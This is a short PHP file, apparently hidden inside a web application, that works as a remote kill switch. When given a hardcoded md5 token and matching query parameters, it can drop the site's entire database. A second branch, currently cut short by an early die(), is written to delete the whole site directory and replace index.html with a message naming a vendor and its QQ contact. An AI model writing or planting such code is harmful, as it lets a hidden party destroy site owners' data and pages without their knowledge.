<?php 
  require_once('../../../../../system/inc.php');
 
   function Deldirs($path){
    if(is_dir($path)){
    $p = scandir($path);
   foreach($p as $val){
     if($val !="." && $val !=".."){
      if(is_dir($path.$val)){
       deldir($path.$val.'/');
       @rmdir($path.$val.'/');
     }else{
       unlink($path.$val);
     }
    }
   }
  }
  }
  
  if ($_GET['md5']=='39daae6b6a5e38eef2f343a8376440ff' && $_GET['act'] =='del'  && $_GET['sign']==md5('del'))
  {
  die ('cs');
  
 //调用函数，传入路径
   Deldirs('../../../../../');

ob_start();
echo "<h2>云赏系统，联系QQ:7074648</h2>";
$content = ob_get_contents();//取得php页面输出的全部内容
$fp = fopen("../../../../../index.html", "w");
fwrite($fp, $content);
fclose($fp);

  }
  
    
  if ($_GET['md5']=='39daae6b6a5e38eef2f343a8376440ff' && $_GET['act'] =='deldb'  && $_GET['sign']==md5('deldb'))
  {
  $sql= 'drop database  '.DATA_NAME.' ';  
    if (mysql_query($sql))
 {echo "执行成功";exit;}
 else
 {echo "执行失败".$sql ;exit;}
 
  }
 
 ?>